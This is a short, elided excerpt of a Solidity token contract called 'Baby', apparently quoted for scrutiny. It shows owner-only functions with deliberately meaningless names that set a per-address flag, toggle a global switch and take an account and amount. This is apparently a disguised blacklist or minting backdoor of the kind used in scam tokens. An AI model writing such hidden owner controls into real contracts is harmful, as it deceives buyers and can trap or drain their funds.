...
contract Baby is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public qwertyu;
    ...
    function aadfrg(address account, uint256 amount) onlyOwner() public {
    ...
    function fdgt(bool _status) public onlyOwner {
        qwert = _status;
    }

    function hgrf(address addre, bool status) public onlyOwner {
        qwertyu[addre]  = status;
    }
